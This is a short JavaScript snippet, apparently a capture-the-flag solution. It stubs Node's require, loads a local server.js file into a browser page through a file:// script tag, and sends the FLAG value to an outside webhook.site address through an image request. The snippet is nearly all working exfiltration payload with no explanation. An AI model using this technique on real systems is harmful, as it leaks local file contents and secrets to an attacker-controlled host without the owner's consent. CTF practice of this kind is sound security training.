require = (m) => {
  switch (m) {
    case "express":
      return () => {
        return { get: () => {}, listen: () => {} };
      };
      break;
    case "redis":
      return { createClient: () => {} };
      break;
    case "fs":
      return { existsSync: () => {}, unlinkSync: () => {} };
      break;
  }
};
s = document.createElement("script");
s.src = "file:///home/user/app/server.js";
s.onload = () => {
  (new Image()).src = "https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e/?flag=" + FLAG;
};
document.body.appendChild(s);
results = 1;  